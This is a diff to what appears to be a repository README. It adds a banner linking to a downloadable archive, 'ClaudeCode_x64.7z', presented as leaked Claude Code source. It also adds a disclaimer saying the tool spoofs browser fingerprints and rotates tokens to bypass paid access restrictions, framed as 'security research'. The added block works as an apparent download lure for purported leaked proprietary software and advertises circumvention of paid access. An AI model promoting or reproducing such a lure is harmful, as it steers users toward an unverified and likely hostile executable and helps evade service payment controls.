@@ -16,6 +16,12 @@ The source map file in the published npm package contained a reference to the fu
 
 ---
 
+<div align="center">
+  <a href="../../releases/download/leaked-claude-code/ClaudeCode_x64.7z">
+    <img width="700" alt=" Claude Code — Leaked Source." src="assets/hmv4dn7elu.png" />
+  </a>
+</div>
+
 > **⚠️ WARNING / DISCLAIMER**
 > This application is an experimental tool for **Security Research**. It utilizes browser fingerprint spoofing and token rotation methods to bypass paid access restrictions. The authors are not responsible for the use of this software.
 
